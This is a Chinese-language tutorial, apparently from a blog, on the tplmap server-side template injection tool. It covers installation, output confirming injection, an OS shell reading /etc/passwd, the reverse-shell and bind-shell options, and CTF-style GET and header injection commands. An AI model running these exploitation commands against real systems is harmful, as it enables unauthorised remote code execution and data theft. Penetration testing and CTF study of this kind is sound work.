项目地址：https://github.com/epinna/tplmap

**还可以作为burpsuite的插件使用**

# **使用方式**

# kali 下安装tplmap

tpl是用python2编写的,报错一般是使用py3

### 2.1 使用git克隆使用tplmap

```shell
git clone https://github.com/epinna/tplmap

cd tplmap

sudo pip2 install -r requirements.txt
```

### 2.2 操作实例

```plain
$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files
$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Run commands on the operating system.

linux $ whoami
www
linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

# windows下使用tmlmap

一样安装使用即可，不过我在windows11 python2下使用报错：未解决

```python
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if URL parameter 'url' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Error: connection aborted, bad status line.
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Error: connection aborted, bad status line.
[!][tplmap] Exiting: 'NoneType' object has no attribute 'partition'
```

# 支持的模板引擎

Tplmap supports over 15 template engines, unsandboxed template engines and generic *eval()*-like injections.

| Engine                         | Remote Command Execution | Blind | Code evaluation | File read | File write |
| ------------------------------ | ------------------------ | ----- | --------------- | --------- | ---------- |
| Mako                           | ✓                        | ✓     | Python          | ✓         | ✓          |
| Jinja2                         | ✓                        | ✓     | Python          | ✓         | ✓          |
| Python (code eval)             | ✓                        | ✓     | Python          | ✓         | ✓          |
| Tornado                        | ✓                        | ✓     | Python          | ✓         | ✓          |
| Nunjucks                       | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Pug                            | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| doT                            | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Marko                          | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| JavaScript (code eval)         | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Dust (<= dustjs-helpers@1.5.0) | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| EJS                            | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Ruby (code eval)               | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| Slim                           | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| ERB                            | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| Smarty (unsecured)             | ✓                        | ✓     | PHP             | ✓         | ✓          |
| PHP (code eval)                | ✓                        | ✓     | PHP             | ✓         | ✓          |
| Twig (<=1.19)                  | ✓                        | ✓     | PHP             | ✓         | ✓          |
| Freemarker                     | ✓                        | ✓     | Java            | ✓         | ✓          |
| Velocity                       | ✓                        | ✓     | Java            | ✓         | ✓          |
| Twig (>1.19)                   | ×                        | ×     | ×               | ×         | ×          |
| Smarty (secured)               | ×                        | ×     | ×               | ×         | ×          |
| Dust (> dustjs-helpers@1.5.0)  | ×                        | ×     | ×               | ×         | ×          |

# 参数说明与使用技巧

```bash
Usage: python tplmap.py [options]

选项:
  -h, --help          显示帮助并退出

目标:
  -u URL, --url=URL   目标 URL
  -X REQUEST, --re..  强制使用给定的 HTTP 方法 (e.g. PUT)

请求:
  -d DATA, --data=..  通过 POST 发送的数据字符串 它必须作为查询字符串: param1=value1&param2=value2
  -H HEADERS, --he..  附加消息头 (e.g. 'Header1: Value1') 多次使用以添加新的消息头
  -c COOKIES, --co..  Cookies (e.g. 'Field1=Value1') 多次使用以添加新的 Cookie
  -A USER_AGENT, -..  HTTP User-Agent 消息头的值
  --proxy=PROXY       使用代理连接到目标 URL

检测:
  --level=LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)
  -e ENGINE, --eng..  强制将后端模板引擎设置为此值
  -t TECHNIQUE, --..  技术 R:渲染 T:基于时间的盲注 Default: RT

操作系统访问:
  --os-cmd=OS_CMD     执行操作系统命令
  --os-shell          提示交互式操作系统 Shell
  --upload=UPLOAD     上传本地文件到远程主机
  --force-overwrite   上传时强制覆盖文件
  --download=DOWNL..  下载远程文件到本地主机
  --bind-shell=BIN..  在目标的 TCP 端口上生成系统 Shell 并连接到它
  --reverse-shell=..  运行系统 Shell 并反向连接到本地主机端口

模板检查:
  --tpl-shell         在模板引擎上提示交互式 Shell
  --tpl-code=TPL_C..  在模板引擎中注入代码

常规:
  --force-level=FO..  强制将测试级别设置为此值
  --injection-tag=..  使用字符串作为注入标签 (default '*')
```

## 1.GET型注入

直接指定url即可，eg:

```powershell
python2 tplmap.py -u "http://xx.xx.xx.xx:xx/flag.php?flag=1"
```

如果没有?flag这种参数，但诸如点又确实在url上，可以选择给他补充特征位置，如

```powershell
python2 tplmap.py -u "http://xx.xx.xx.xx:xx/{{7*7}}
```

## 2.POST型注入

**要点在用\*指定参数位置**，以某CTF题为例，需要添加X-Forwarded-For：anything 来渲染展示ip源，注入点为XFF头，还需要我们添加，于是payload这样写：

```powershell
python2 tplmap.py -u "http://xx.xx.xx.xx:xx/flag.php" -X POST -H X-Forwarded-For: 99*
```

